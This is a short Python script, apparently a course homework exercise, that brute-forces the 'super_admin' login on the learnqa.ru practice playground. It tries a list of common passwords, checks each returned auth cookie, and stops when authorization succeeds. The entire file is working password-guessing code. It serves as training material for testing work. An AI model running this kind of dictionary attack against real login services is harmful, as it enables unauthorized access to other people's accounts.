import requests

login = "super_admin"
get_secret_password_url = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
check_auth_cookie_url = 'https://playground.learnqa.ru/ajax/api/check_auth_cookie'
password_list = ["123456", "12345678", "qwerty", "password", "abc123", "monkey", "1234567", "letmein",
                             "trustno1", "dragon", "baseball", "111111", "welcome", "iloveyou", "master", "sunshine", "ashley",
                             "bailey", "passw0rd", "shadow", "123123", "654321", "superman", "qazwsx", "michael",
                             "Football","!@#$%^&*"]

for password in password_list:
        response1 = requests.post(get_secret_password_url, data={"login": login, "password": password})
        cookie_value = response1.cookies.get("auth_cookie")
        cookies = {'auth_cookie': cookie_value}
        response2 = requests.post(check_auth_cookie_url, cookies = cookies)
        if response2.text == "You are NOT authorized":
            print(response2.text)
        elif response2.text != "You are NOT authorized":
            print(response2.text + ": " + "password - " + response1.json()['password'])
            break



